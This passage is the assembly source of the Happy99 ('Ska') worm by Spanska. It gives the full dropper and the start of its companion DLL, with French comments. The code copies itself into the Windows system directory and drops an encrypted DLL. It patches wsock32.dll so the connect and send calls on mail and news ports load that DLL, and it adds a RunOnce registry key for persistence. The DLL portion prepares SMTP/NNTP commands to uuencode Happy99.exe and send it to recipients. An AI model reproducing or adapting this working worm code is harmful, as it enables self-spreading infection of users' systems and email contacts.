ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[Happy99_ska_exe.asm]ÄÄÄ
;ska.exe = happy99.exe
;if you want to understand comments, learn french or use Altavista ;)
;at the very end, you can post a message for me in alt.comp.virus
;look at the readme.rtf with WordPad for some explanations
;
; created files:
;
;  wsock32.ska		clean backup of wsock32.dll
;  ska.dll		my dll
;  ska.exe		the dropper
;  Happy99.exe		the traveller
;  liste.ska		list of infected friends

;--------------------------- (c) Spanska 1999 ---------------------------------

.386
.model flat

;*******************************************************************************************
;***                               API WINDOWS UTILISEES                                 ***
;*******************************************************************************************

extrn           ExitProcess		:PROC
extrn		CreateFileA		:PROC
extrn		ReadFile		:PROC
extrn		WriteFile		:PROC
extrn		CloseHandle		:PROC
extrn		CreateFileMappingA	:PROC
extrn		MapViewOfFile		:PROC
extrn		UnmapViewOfFile		:PROC
extrn		GetFileSize		:PROC
extrn		GetModuleHandleA	:PROC
extrn		GetProcAddress		:PROC
extrn 		GetVersionExA		:PROC
extrn		GetSystemDirectoryA	:PROC
extrn		GetWindowsDirectoryA	:PROC
extrn		CopyFileA		:PROC
extrn		LocalAlloc		:PROC
extrn		LocalFree		:PROC
extrn		GetModuleFileNameA	:PROC
extrn		RegCreateKeyExA		:PROC
extrn		RegSetValueExA		:PROC
extrn		RegCloseKey		:PROC

extrn		RegisterClassA		:PROC
extrn		CreateWindowExA		:PROC
extrn		ShowWindow		:PROC
extrn		UpdateWindow		:PROC
extrn		PeekMessageA		:PROC
extrn		SetPixelV		:PROC
extrn		TranslateMessage	:PROC
extrn		DispatchMessageA	:PROC
extrn		DefWindowProcA		:PROC
extrn		GetDC			:PROC
extrn		ReleaseDC		:PROC
extrn		PostQuitMessage		:PROC

.data

;*******************************************************************************************
;***                                       DATAS                                         ***
;*******************************************************************************************

;============================= madll.dll compressée et cryptée =============================

include madll.inc

;================================== quelques noms cryptés ==================================

signature	dd not "i sI", not " a t", not "uriv", not "a ,s", not "row ", not "a ,m"
		dd not "ort ", not "?naj", not "UOM ", not "OM-T", not "H TU", not "irby"
		dd not "c( d", not "pS )", not "ksna", not "91 a", not 0+".99"

		;db "Is it a virus, a worm, a trojan? MOUT-MOUT Hybrid (c) Spanska 1999"

wsock_name		dd not "osw\"			;db "\wsock32.dll",0
			dd not "23kc"
			dd not "lld."
			db not 0
wsock_name_size		equ $-offset wsock_name

ma_dll_name		dd not "akS\"			;db "\Ska.dll",0
			dd not "lld."
			db not 0
ma_dll_name_size	equ $-offset ma_dll_name

dropper_name		dd not "akS\"			;db "\Ska.exe",0
			dd not "exe."
			db not 0
dropper_name_size	equ $-offset dropper_name

sub_key_name		dd not "tfoS"
			dd not "eraw"
			dd not "ciM\"
			dd not "osor"			;db "Software\Microsoft\Windows\
			dd not "W\tf"			;db "CurrentVersion\RunOnce",0
			dd not "odni"
			dd not "C\sw"
			dd not "erru"
			dd not "eVtn"
			dd not "oisr"
			dd not "uR\n"
			dd not "cnOn"
			dw not 0+"e"

;====================================== divers ======================================

wsock_handle		dd ?
filehandlestock		dd ?
filemappinghandle	dd ?
startoffilemapping	dd ?
sizeofmappedfile	dd ?

startofPEheader		dd ?
nbofsection		dw ?
szoptheader		dw ?
diff			dd ?
cdiff			dd ?
idiff			dd ?
addoffunctions		dd ?
addofnames		dd ?		;ne pas séparer ces trois
addofordinals		dd ?
rvaendofcode		dd ?
rvaoriginale_1		dd ?
rvaoriginale_2		dd ?
startofcodeheader	dd ?
verif			dd ?

krnl32ofs		dd ?
krnl32name		db "KERNEL32.dll",0
llname			db "LoadLibraryA",0
flname			db "FreeLibrary",0
gpaname			db "GetProcAddress",0

llofs			dd ?
flofs			dd ?
gpaofs			dd ?

writebuffer		dd ?		;writebuffer
system_dir		dd ?		;writebuffer+28000	;ne pas séparer!
dropper_dir		dd ?		;writebuffer+28200
system_dir_size		dd ?
NbBytesWritten		dd ?
ma_dll_handle		dd ?
NumberOfBytesRead	dd ?
key_handle		dd ?
patch_size		equ offset endpatch-offset startpatch

;============================ pour l'effet graphique ===========================

wndclass:
        clsStyle          dd 4003h	; class style
        clsLpfnWndProc    dd ?
        clsCbClsExtra     dd 0
        clsCbWndExtra     dd 0
        clsHInstance      dd ?		; instance handle
        clsHIcon          dd 0		; class icon handle
        clsHCursor        dd 0		; class cursor handle
        clsHbrBackground  dd 7		; class background brush
        clsLpszMenuName   dd 0		; menu name
        clsLpszClassName  dd ?		; far ptr to class name

msg:
	msHWND          dd ?
	msMESSAGE       dd ?
	msWPARAM        dd ?
	msLPARAM        dd ?
	msTIME          dd ?
	msPT            dd ?
	protege dd ?

nb_explosions		dd 0
compteur		dd 0
yy			dd ?
xx			dd ?
seed			dd 0FFAABB11h
theDC			dd ?
nom_fenetre		db "Happy New Year 1999 !!",0
handle			dd ?
handle_wd		dd ?
adresse_retour		dd ?
pas_d_effet_graphique	dd ?

.code

HOST:

;*******************************************************************************************
;***                             SE RESERVER DE LA MEMOIRE                               ***
;*******************************************************************************************

push 1024*30		;number of bytes to allocate
push LARGE 40h		;allocation attributes (40h=LMEM_ZEROINIT)
call LocalAlloc
test eax, eax
jz stop
push eax

mov edi, offset writebuffer
stosd
add eax, 28000
stosd
add eax, 200
stosd

;*******************************************************************************************
;***                     VERIFIER QU'ON EST PAS SOUS W3.1                                ***
;*******************************************************************************************

;-------- quelle version de Windows?

pop eax
push eax
push eax
push eax
pop edi
mov eax, 148
stosd
call GetVersionExA
pop esi
add esi, 16
lodsd
cmp eax, 0			;win32s=0, win32=1, WinNT=2
je stop

;*******************************************************************************************
;***                   COPIER LE DROPPER DANS C:\WINDOWS\SYSTEM                          ***
;*******************************************************************************************

;----- décrypter les datas

mov esi, offset signature
push esi
pop edi
mov ecx, offset wsock_handle - offset signature
decrypte:
lodsb
not al
stosb
loop decrypte

;----- recupérer le directory système 

push 200
push system_dir
call GetSystemDirectoryA		;généralement C:\WINDOWS\SYSTEM
test eax, eax
jz stop2
mov system_dir_size, eax

;----- faire une copie du dropper dans C:\WINDOWS\SYSTEM

push 200
push dropper_dir
push 0
call GetModuleFileNameA			;récupérer son path actuel
test eax, eax
jz stop2

mov esi, dropper_dir			;si jamais le prog est "Ska"
add esi, eax				;et pas "Happy1999", se souvenir
sub esi, 5				;de ne pas déclencher l'effet
lodsb					;parce qu'il y a des chances
and al, 0DFh				;que ce soit au boot
cmp al, "A"
jne c_pas_ska
mov pas_d_effet_graphique, -1

c_pas_ska:
mov esi, offset dropper_name
mov edi, system_dir
add edi, system_dir_size
mov ecx, dropper_name_size
rep movsb				;concatenate "C:\WINDOWS\SYSTEM" et "DROP.EXE"

push 1					;si déjà présent, erreur
push system_dir
push dropper_dir
call CopyFileA				;pas de test d'erreur car si on est au boot,
					;cet abruti se copie sur lui-même

;*******************************************************************************************
;***                      CREER MA DLL DANS C:\WINDOWS\SYSTEM                            ***
;*******************************************************************************************

;-------- décompresser et créér madll.dll dans C:\WINDOWS\SYSTEM

mov esi, offset A
mov edi, writebuffer

loop_decompresse:
lodsd
cmp eax, " DNE"
je fin_decompresse
cmp eax, "OREZ"
je suite_de_zero_a_decompresser
not eax
stosd
jmp loop_decompresse

suite_de_zero_a_decompresser:
lodsd
mov ecx, eax
xor eax, eax
rep stosd
jmp loop_decompresse

fin_decompresse:
mov ecx, edi
sub ecx, writebuffer
mov NbBytesWritten, ecx

mov esi, offset ma_dll_name	;concatenate "c:\windows\system" and "madll.dll"
mov edi, system_dir
add edi, system_dir_size
mov ecx, ma_dll_name_size
rep movsb

xor eax, eax
push eax			;handle of file with attributes to copy (0=Ludwig)
push 80h			;file attributes (80h=FILE_ATTRIBUTE_NORMAL)
push 2				;how to create (2=CREATE_ALWAYS)
push eax			;address of security descriptor (0=Ludwig)
push eax			;share mode (0=Prevents the file from being shared)
push 40000000h			;access (read-write) mode (40000000h=GENERIC_WRITE)
push system_dir			;address of file name
call CreateFileA
inc eax
jz stop
dec eax
mov ma_dll_handle, eax

push 0				;addr. of structure needed for overlapped I/O (0 pour normale)
push offset NbBytesWritten	;address of number of bytes written (si jamais tout n'est pas écrit)
push NbBytesWritten		;number of bytes to write
push writebuffer		;address of data to write to file
push ma_dll_handle		;handle of file to write to
call WriteFile
test eax, eax
jz stop2

;*******************************************************************************************
;***                    FAIRE UNE COPIE PROPRE DE WSOCK32.DLL                            ***
;*******************************************************************************************

;------ créér le path entier de wsock32

mov esi, offset wsock_name
mov edi, system_dir
add edi, system_dir_size
mov ecx, wsock_name_size
rep movsb				;concatenate "C:\WINDOWS\SYSTEM" et "WSOCK32.DLL"

;----- en faire une copie propre (ne suis-je point gentil?)

mov esi, system_dir
mov edi, dropper_dir
mov ecx, system_dir_size
add ecx, 13-4
rep movsb
mov eax, 0+"aks"
stosd

push 1					;si déjà présent, erreur
push dropper_dir
push system_dir
call CopyFileA

;*******************************************************************************************
;***                    INFECTER C:\WINDOWS\SYSTEM\WSOCK32.DLL                           ***
;*******************************************************************************************

;-------- ouvre wsock32.dll

xor eax, eax
push eax		;handle of file with attributes to copy (0=Ludwig)
push 80h		;file attributes (80h=FILE_ATTRIBUTE_NORMAL)
push 3			;how to create (3=OPEN_EXISTING)
push eax		;address of security descriptor (0=Ludwig)
push eax		;share mode (0=Prevents the file from being shared)
push 0C0000000h		;access (read-write) mode (0C0000000h=GENERIC_READ+GENERIC_WRITE)
push system_dir		;address of name of the file
call CreateFileA
inc eax
jnz la_suite_bordel

;------ si wsock32.dll en cours d'utilisation, le dropper s'éxécute au prochain boot

xor eax, eax
push writebuffer
push offset key_handle
push eax
push 1F0000h+1+2+4+8+10h+20h
push eax
push eax
push eax
push offset sub_key_name
push 80000002h				;HKEY_LOCAL_MACHINE = 80000002h
call RegCreateKeyExA

mov eax, dropper_name_size-1
push eax
mov eax, offset dropper_name
inc eax
push eax
push 1					;REG_SZ=1
push 0
push eax
push key_handle
call RegSetValueExA

push key_handle
call RegCloseKey

jmp stop2

la_suite_bordel:
dec eax
mov wsock_handle, eax

;-------- prepare le mapping de wsock32.dll

xor eax, eax
push eax		;name of file-mapping object (0=sans nom)
push eax		;low-order 32 bits of object size  
push eax		;high-order 32 bits of object size  (0=meme taille que le fichier)
push 4			;protection for mapping object (4=PAGE_READWRITE)
push eax		;optional security attributes (0=défaut)
push wsock_handle	;handle of file to map
call CreateFileMappingA
test eax, eax
jz stop3
mov filemappinghandle, eax

;-------- mappe wsock32.dll

xor eax, eax
push eax		;number of bytes to map (0=en entier)
push eax		;low-order 32 bits of file offset
push eax		;high-order 32 bits of file offset (0=meme taille que le fichier?)
push 6			;access mode (6=SECTION_MAP_READ+SECTION_MAP_WRITE)
push filemappinghandle	;file-mapping object to map into address space  
call MapViewOfFile
test eax, eax
jz stop4
mov startoffilemapping, eax

;------- verifie le MZ dans le header

mov esi, eax
cmp word ptr [esi], "ZM"
jne stop4

;------- verifie si deja infecte

cmp byte ptr [esi+12h], "z"
je stop4
mov byte ptr [esi+12h], "z"

;------- verifie le PE dans le header

add esi, [esi+3ch]			;taille du stub DOS
cmp word ptr [esi], "EP"
jne stop4
mov startofPEheader, esi

;------- recupere quelques donnees dans le header

mov ax, [esi+6]
mov nbofsection, ax			;number of sections
xor ecx, ecx
mov cx, nbofsection

mov ax, [esi+20]
mov szoptheader, ax			;size of optional header

mov ebx, esi
add ebx, 24
xor eax, eax
add ax, szoptheader
add ebx, eax

;------- trouve les sections .edata, .text, .data

ttes_les_sections:
mov eax, [ebx]
cmp eax, "xet."
je trouve_text
continue_apres_text:
cmp eax, "ade."
je trouve_edata
continue_apres_edata:
cmp eax, "tad."
je trouve_data
continue_apres_data:
add ebx, 40			;taille d'un section header 
dec ecx
jnz ttes_les_sections
jmp tout_trouve

;------- recupere des donnees dans le header de la section "exported data"

trouve_edata:
mov eax, [ebx+12]
sub eax, [ebx+20]
mov diff, eax
jmp continue_apres_edata

;------- recupere des donnees dans le header de la section "code"

trouve_text:
test [ebx+36], 60000020h	;test si c'est du code
jz stop
or [ebx+36], 80000000h		;rendre la section code capable d'être automodifiée
mov startofcodeheader, ebx
mov eax, [ebx+16]
mov edi, [ebx+8]
sub eax, edi
cmp eax, patch_size		;test si suffisamment de place ds section code
jb stop
mov eax, [ebx+12]
mov edx, [ebx+20]
sub eax, edx
mov cdiff, eax
add edx, edi
mov rvaendofcode, edx
jmp continue_apres_text

;------- recupere des donnees dans le header de la section "imported data"

trouve_data:
mov eax, [ebx+12]
sub eax, [ebx+20]
mov idiff, eax
jmp continue_apres_data

;---------- se préparer à scanner la table des fonctions exportées

tout_trouve:

mov edi, offset addoffunctions
mov edx, diff
mov ebx,[esi+120]
mov esi, startoffilemapping			; get export table RVA
sub ebx, edx
add ebx, esi

mov eax, [ebx+28]
sub eax, edx
add eax, esi
stosd						;addoffunctions
mov eax, [ebx+32]
sub eax, edx
add eax, esi
stosd						;addofnames
mov eax, [ebx+36]
sub eax, edx
add eax, esi
stosd						;addofordinals

mov ecx,[ebx+24]                          ; get number of name ptrs
xor edx,edx                               ; edx is our ordinal counter
mov esi, addofnames

;trouve le point d'entrée des fc exportées (connect, send) dans l'image mappée de Wsock32.dll

mov verif, 0			;pour vérifier qu'on a bien trouvé les 2 fonctions
cherche_API:
mov ebx, [esi]
sub ebx, diff
add ebx, startoffilemapping
mov eax, [ebx]
cmp eax, "nnoc"
je trouve_API_1
cmp eax, "dnes"
je trouve_API_2
fausse_alerte:
inc edx
add esi, 4
dec ecx
jnz cherche_API
cmp verif, 2			;on en cherche 2
jne stop
jmp suite

;-------- on a trouvé "connect"

trouve_API_1:
add ebx, 4
mov eax, [ebx]
cmp eax, 0+"tce"
jne fausse_alerte

push edx
push esi

mov ebx, addofordinals
shl edx, 1
add ebx, edx

xor eax, eax
mov ax, word ptr [ebx]

mov esi, addoffunctions 
shl eax, 2
add esi, eax

mov eax, [esi]				;dans eax: RVA de connect
mov rvaoriginale_1, eax

mov eax, rvaendofcode
add eax, cdiff
add eax, (offset redirect_to_my_connect - offset startpatch)
mov [esi], eax				;changer le point d'entree de la fonction

inc verif				;une fc trouvée de plus
pop esi
pop edx
jmp fausse_alerte

;-------- on a trouvé send

trouve_API_2:
add ebx, 4
mov al, byte ptr [ebx]
cmp al, 0
jne fausse_alerte

push edx
push esi

mov ebx, addofordinals
shl edx, 1
add ebx, edx

xor eax, eax
mov ax, word ptr [ebx]

mov esi, addoffunctions 
shl eax, 2
add esi, eax

mov eax, [esi]				;dans eax: RVA de send
mov rvaoriginale_2, eax

mov eax, rvaendofcode
add eax, cdiff
add eax, (offset redirect_to_my_send - offset startpatch)
mov [esi], eax				;changer le point d'entree de la fonction

inc verif				;une fc trouvée de plus
pop esi
pop edx
jmp fausse_alerte

suite:

mov esi, startofcodeheader
add dword ptr [esi+8], patch_size	;changer dans le header la taille du code total

;------- cherche l'offset-handle du kernel32

push offset krnl32name
call GetModuleHandleA
test eax, eax
jz stop4
mov krnl32ofs, eax

;------- cherche l'adresse de l'API LoadLibrary qu'on appelera dans le patch 
;(mieux vaut aller direct dans le Kernel)

push offset llname
push krnl32ofs
call GetProcAddress
test eax, eax
jz stop4
mov llofs, eax

;------- cherche l'adresse de l'API FreeLibrary qu'on appelera dans le patch
;(mieux vaut aller direct dans le Kernel)

push offset flname
push krnl32ofs
call GetProcAddress
test eax, eax
jz stop4
mov flofs, eax

;------- cherche l'adresse de l'API GetProcAddress qu'on appelera dans le patch 
;(mieux vaut aller direct dans le Kernel)

push offset gpaname
push krnl32ofs
call GetProcAddress
test eax, eax
jz stop4
mov gpaofs, eax

;------- installer le patch

mov edi, rvaendofcode
add edi, startoffilemapping
call endpatch
	
	;********************** CODE INSERE DANS WSOCK32.DLL **********************

	startpatch:

	;===============> point d'entrée de la nouvelle connect <======================

	redirect_to_my_connect:
	pushfd
	pushad

	;----- chope delta offset

	call delta1
	delta1: pop edi
	add edi, offset no_socket_mail-offset delta1

	;----- vérifier si c'est une session mail ou news

	mov ebx, [esp+32+4+4+4]		;32=pushad/4=pushfd/4=call/4=no de socket
	mov byte ptr al, [ebx+3]	;le port dans al
	cmp al, 25			;connection mail?
	jne teste_119
	mov eax, [esp+32+4+4]		;no de socket
	stosb				;stocke le no de socket connectée au port 25 
					;(dans no_socket_mail)
	inc edi				;edi pointe maintenant sur handle_madll
	jmp la_suite
	teste_119:
	cmp al, 119			;connection news?
	jne retour_a_connect		;non=>on revient au send original
	inc edi				;edi pointe maintenant vers no_socket_news
	mov eax, [esp+32+4+4]		;no de socket
	stosb				;stocke le no de socket connectée au port 119 
					;(dans no_socket_news)
	
	;------ on charge ma librairie (LoadLibrary)

	la_suite:
	call ici_offset_de_ll			;pour avoir "madll.dll" sur le stack
	db "Ska.dll",0
	ici_offset_de_ll: 
	mov eax, -1				;!!!transformé au moment de l'infection!!!!!
	call eax				;call LoadLibrary
	stosd					;sauver le handle de ma librairie

	;------ et on se casse

	retour_a_connect:
	popad
	popfd
	ici_retour_relatif_a_connect:
	db 0E9h,0,0,0,0				;!!!transformé au moment de l'infection!!!!!

	;================> point d'entrée de la nouvelle send <============================

	redirect_to_my_send:
	pushfd
	pushad

	;----- chope delta offset

	call delta2
	delta2: pop esi
	add esi, offset no_socket_mail-offset delta2

	;----- on vérifie le numero de socket

	lodsw					;no_socket_mail = al, no_socket_news = ah
	mov ebx, [esp+32+4+4]			;no de socket de la session actuelle
	cmp ah, bl				;la socket actuelle est liée au port 119?
	je send_port_nntp			;oui => on va ds la dll, routine "news"
	cmp al, bl				;la socket actuelle est liée au port 25?
	je send_port_smtp			;oui => on va ds la dll, routine "mail"

	jmp retour_a_send			;socket actuelle liée à autre port, on revient

	;------ récupérer l'offset de ma fonction (GetProcAddress)

	send_port_smtp:
	call zz_getprocad1			;pour avoir "mail" sur le stack
	db "mail",0

	send_port_nntp:
	call zz_getprocad1			;pour avoir "news" sur le stack
	db "news",0

	zz_getprocad1:
	lodsd					;récup du handle de ma librairie
	push eax				;handle de ma librairie
	ici_offset_de_gpa:
	mov eax, -1				;!!!transformé au moment de l'infection!!!!
	call eax				;call GetProcAddress
	test eax, eax				;probleme?
	jz retour_a_send			;oui => on se casse

	;------ appeler ma fonction avant send

	call eax				;call MaFonction dans ma dll
	cmp al, 1				;si en retour al=1, on ne décharge pas ma dll
	je retour_a_send			;mais on revient simplement au send original
	xchg ax, bx				;dans bl on a "N" ou "M"

	;------ ma fonction a fini son travail?

	call delta3
	delta3: pop esi
	add esi, offset no_socket_mail-offset delta3	;esi pointe vers no_socket_mail

	push esi
	pop edi					;edi aussi
	xor eax, eax

	cmp bl, "N"				;une session news a foiré?
	jne autre				;non => teste si c'est du mail
	inc edi					;edi pointe vers no_socket_news
	stosb					;on annule le hook de send_news
	lodsb					;et on regarde si send_mail est toujours hooké
	cmp al, 0
	jne retour_a_send			;send_mail est toujours hooké => on revient
	inc esi					;esi pointe vers handle_madll
	jmp unload_dll				;send_mail n'est pas hooké non plus 
						;=> on décharge ma dll (facon de parler)

	autre:
	cmp bl, "M"				;une session mail a foiré?
	jne retour_a_send			;non => on revient
	stosb					;on annule le hook de send_mail
	inc edi					;edi pointe vers handle_madll
	inc esi					;esi pointe vers no_socket_news
	lodsb					;on regarde si send_news est toujours hooké
	cmp al, 0
	jne retour_a_send			;send_news est toujours hooké => on revient

	;------ si oui, on décharge ma librairie

	unload_dll:
	lodsd					;handle de ma dll dans eax
	push eax
	ici_offset_de_fl:
	mov eax, -1				;!!!transformé au moment de l'infection!!!!!
	call eax				;call FreeLibrary

	;----- on revient au send original

	retour_a_send:
	popad
	popfd
	ici_retour_relatif_a_send:
	db 0E9h,0,0,0,0				;!!!transformé au moment de l'infection!!!!!

	no_socket_mail:		db 0
	no_socket_news:		db 0		;ne pas séparer ces trois enfoirés
	handle_madll:		dd 0
	
	endpatch:

	;***************************** FIN DU CODE INSERE ******************


;------ écrire le code dans l'image mappée

pop esi
mov ecx, offset endpatch-offset startpatch
rep movsb

;------ écrire les bonnes références aux 3 API du kernel

mov eax, llofs
mov [edi-(offset endpatch-offset ici_offset_de_ll)+1], eax
mov eax, gpaofs
mov [edi-(offset endpatch-offset ici_offset_de_gpa)+1], eax
mov eax, flofs
mov [edi-(offset endpatch-offset ici_offset_de_fl)+1], eax

;----- écrire les bons sauts de retour

mov edx, cdiff
mov eax, rvaendofcode
add eax, edx
add eax, (offset ici_retour_relatif_a_connect- offset startpatch)+4
sub eax, rvaoriginale_1
not eax
mov [edi-(offset endpatch-offset ici_retour_relatif_a_connect)+1], eax

mov eax, rvaendofcode
add eax, edx
add eax, (offset ici_retour_relatif_a_send- offset startpatch)+4
sub eax, rvaoriginale_2
not eax
mov [edi-(offset endpatch-offset ici_retour_relatif_a_send)+1], eax

stop5:
push startoffilemapping
call UnmapViewOfFile

stop4:
push filemappinghandle
call CloseHandle

stop3:
push wsock_handle
call CloseHandle

stop2:
push writebuffer
call LocalFree

stop:
cmp pas_d_effet_graphique, 0
je effet_graphique

push LARGE -1
call ExitProcess             ;this simply terminates the program

;*******************************************************************************************
;***                                 EFFET GRAPHIQUE                                     ***
;*******************************************************************************************

effet_graphique:
nombre_explosion_maxi equ 16

;----- se réserver de la mémoire

push (32*257)*nombre_explosion_maxi		;number of bytes to allocate
push LARGE 40h					;allocation attributes (40h=LMEM_ZEROINIT)
call LocalAlloc
mov writebuffer, eax

;----- enregistrer la wndclass

push 0
call GetModuleHandleA
mov handle, eax

mov clsHInstance, eax
mov eax, offset wndproc
mov clsLpfnWndProc, eax
mov clsLpszClassName, offset nom_fenetre

push offset wndclass
call RegisterClassA

;----- creer la fenetre

xor eax, eax
push eax
push handle
push eax
push eax
push 512			;hauteur
push 256			;largeur
push 100			;y
push 100			;x
push 00080000h+00040000h
push offset nom_fenetre
push offset nom_fenetre
push eax				;extra style
call CreateWindowExA
mov handle_wd, eax

push 1
push handle_wd
call ShowWindow

push handle_wd
call UpdateWindow

push handle_wd
call GetDC
mov theDC, eax

;----- le message loop

msg_loop:
xor eax, eax
push 1
push eax
push eax
push eax
push offset msg
call PeekMessageA
test eax, eax
jnz process_messages

;-------- dessiner tous les points

mov eax, compteur
and eax, nombre_explosion_maxi-1
mov compteur, eax
cmp eax, 0
jz ini_explosion

la_suite@:

mov ecx, 16*256
mov esi, writebuffer

zozo2:
push ecx
push esi
pop edi
add edi, 20
mov eax, dword ptr [esi+8]
stosd
mov eax, dword ptr [esi+12]
stosd

add dword ptr [esi], 001000h
lodsd
add dword ptr [esi+4], eax
lodsd
add dword ptr [esi+4], eax

lodsd
sar eax, 16
mov edx, eax
lodsd
sar eax, 16
mov ebx, eax

lodsd
cmp eax, 0
jne point_pas_noir
add esi, 8
jmp fin_loop

point_pas_noir:
sub byte ptr [esi-4], 1
jnc R_pas_a_zero
mov byte ptr [esi-4], 0
R_pas_a_zero:
sub byte ptr [esi-3], 1
jnc G_pas_a_zero
mov byte ptr [esi-3], 0
G_pas_a_zero:
sub byte ptr [esi-2], 1
jnc B_pas_a_zero
mov byte ptr [esi-2], 0
B_pas_a_zero:

push esi

push eax		;colorref
push edx		;y
push ebx		;x
push theDC		;the Device Context
call SetPixelV		;quand la fenetre est repeinte, on met le pixel à sa coordonnée

pop esi

lodsd
sar eax, 16
mov edx, eax
lodsd
sar eax, 16

push esi

push 0
push edx
push eax
push theDC
call SetPixelV

pop esi

fin_loop:
add esi, 4

pop ecx
dec ecx
jnz zozo2

inc compteur

jmp msg_loop

;----- pour voir si la fenetre est fermée

process_messages:

cmp msMESSAGE, 12h	;WM_QUIT equ 0012h
je end_loop

mov eax, offset msg
push eax
push eax
call TranslateMessage
call DispatchMessageA
jmp msg_loop

end_loop:

push theDC
push handle_wd
call ReleaseDC

mov pas_d_effet_graphique, -1

jmp stop2

;----- procédure de fenêtre vide pour accélérer

wndproc:

pop eax
mov adresse_retour, eax
cmp dword ptr [esp+4], 2
jne suite_prout

push 0
call PostQuitMessage
xor eax, eax
jmp suite2

suite_prout:
call DefWindowProcA

suite2:
mov ecx, adresse_retour
push ecx

ret

;----- procédure pour initialiser une explosion

ini_explosion:

mov eax, nb_explosions
and eax, nombre_explosion_maxi-1
mov nb_explosions, eax
shl eax, 13
mov edi, writebuffer
add edi, eax
mov ecx, 256

call random
shr eax, 8
mov xx, eax
call random
shr eax, 8
mov yy, eax
call random
shr eax, 8
or eax, 0AF0F0Fh
mov ebx, eax

zozo:
call random
shr eax, 15
mov [edi], eax

mov [edi+4], ecx
fild dword ptr [edi+4]		;slow but good for size
fsin
fimul dword ptr [edi]
fild dword ptr [edi+4]
fcos
fimul dword ptr [edi]
fistp dword ptr [edi]
fistp dword ptr [edi+4]

add edi, 8

mov eax, yy
stosd
mov eax, xx
stosd

mov eax, ebx
stosd

add edi, 12
loop zozo

inc nb_explosions
jmp la_suite@

;----- random

random: 

mov eax, 214013h
imul seed
sub edx, edx                ; Prevent divide overflow by caller
add eax, 2531011h
mov seed, eax
ret

end     HOST

;--------------------------- (c) Spanska 1999 ---------------------------------
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[Happy99_ska_exe.asm]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[Happy99_ska_dll.asm]ÄÄÄ
;ska.dll
;if you want to understand comments, learn french or use Altavista ;)
;at the very end, you can post a message for me in alt.comp.virus
;look at the readme.rtf with WordPad for some explanations

;--------------------------- (c) Spanska 1999 ---------------------------------

.386
.model flat

;*******************************************************************************************
;***                               API WINDOWS UTILISEES                                 ***
;*******************************************************************************************

extrn		recv			:PROC
extrn		WSAGetLastError		:PROC
extrn		LocalAlloc		:PROC
extrn		LocalFree		:PROC
extrn		GetSystemDirectoryA	:PROC
extrn		CreateFileA		:PROC
extrn		CreateFileMappingA	:PROC
extrn		MapViewOfFile		:PROC
extrn		UnmapViewOfFile		:PROC
extrn		GetFileSize		:PROC
extrn		CloseHandle		:PROC
extrn		WriteFile		:PROC
extrn		ReadFile		:PROC
extrn		SetFilePointer		:PROC

.data

;*******************************************************************************************
;***                                  ZONE DE DONNEES                                    ***
;*******************************************************************************************

;======================== commandes pour les serveurs ======================================

smtp_sender_size	dd ?
smtp_recipient_size	dd ?

smtp_rset		db "RSET",0Dh,0Ah
size_smtp_rset		equ $-offset smtp_rset

smtp_data		db "DATA",0Dh,0Ah
size_smtp_data		equ $-offset smtp_data

nntp_post		db "POST",0Dh,0Ah
size_nntp_post		equ $-offset nntp_post

point 			db 0Dh,0Ah,2Eh,0Dh,0Ah		;"."
size_point		equ $-offset point

;========================= données pour le uucodage ========================================

filemappinghandle	dd ?
startoffilemapping	dd ?
sizeofmappedfile	dd ?
nb_45			dd ?
reste_45		db ?
nb_1000			dd ?
reste_1000		dd ?
size_uu_file		dd ?

debut			db not 0Dh, not 0Ah		;db 0Dh,0Ah,"begin 644
			dd not "igeb"			;Happy99.exe",0Dh,0Ah
			dd not "46 n"
			dd not "aH 4"
			dd not "9ypp"
			dd not "xe.9"
			db not "e"
			db not 0Dh, not 0Ah
size_debut		equ $-offset debut

fin			db not 60h			;db 60h, 0Dh,0Ah,"end",0Dh,0Ah
			db not 0Dh, not 0Ah
			db not "e", not "n", not "d"
			db not 0Dh, not 0Ah
size_fin		equ $-offset fin

;============================== mes fichiers ===============================================

dropper_name		dd not "akS\"			;db "\Ska.exe",0
			dd not "exe."
			db not 0
dropper_name_size	equ $-offset dropper_name

liste_name		dd not "sil\"			;db "\liste.ska",0
			dd not "s.et"
			dw not "ak"
			db not 0
liste_name_size		equ $-offset liste_name

dropper_handle		dd ?
liste_handle		dd ?
liste_size		dd ?
system_dir_size		dd ?

;=================================== divers =================================================

size_headers		dd ?
offset_mem_buffer	dd ?
original_send		dd ?
no_socket		dd ?
nb_rcpt			dd 0
faut_pas_envoyer_mail	dd 0

offset_mem_buffer2_headers	dd ?		;mem_buffer2
offset_mem_buffer2_recipient	dd ?		;mem_buffer2 + 3000	;ne pas séparer
offset_mem_buffer2_sender	dd ?		;mem_buffer2 + 6000
offset_mem_buffer2_rcv		dd ?		;mem_buffer2 + 7000
offset_mem_buffer2_system_dir	dd ?		;mem_buffer2 + 7100

.code

dll:

;*******************************************************************************************
;***                      ROUTINES D'INITIALISATION DE LA DLL                            ***
;*******************************************************************************************

PUBLIC dllini
dllini proc

;------- Procédure de chargement ou de déchargement ?

cmp dword ptr [esp+8], 0	;1=DLL_PROCESS_DETACH ds la proc DllEntryPoint
je dechargement_dll

cmp dword ptr [esp+8], 1	;1=DLL_PROCESS_ATTACH ds la proc DllEntryPoint
je chargement_dll		;pas 1, teste 0

jmp end_ini_proc

;------ Cette routine est appelée à chaque chargement de la DLL

chargement_dll:

;----- décrypter les datas

mov esi, offset debut
push esi
pop edi
mov ecx, offset dropper_handle - offset debut
decrypte:
lodsb
not al
stosb
loop decrypte

;------- se réserver 5 Ko de mémoire pour headers/rcpt si ce n'est pas deja fait

push 8*1024
push 40h
call LocalAlloc
test eax, eax
jnz ca_baigne
xor eax, eax
jmp end_ini_proc_with_problem

ca_baigne:
mov edi, offset offset_mem_buffer2_headers
stosd
add eax, 3000
stosd
add eax, 3000
stosd
add eax, 1000
stosd
add eax, 100
stosd

jmp end_ini_proc

;------ Cette routine est appelée à chaque déchargement de la DLL

dechargement_dll:

push offset_mem_buffer2_headers			;le petit tampon intermédiaire
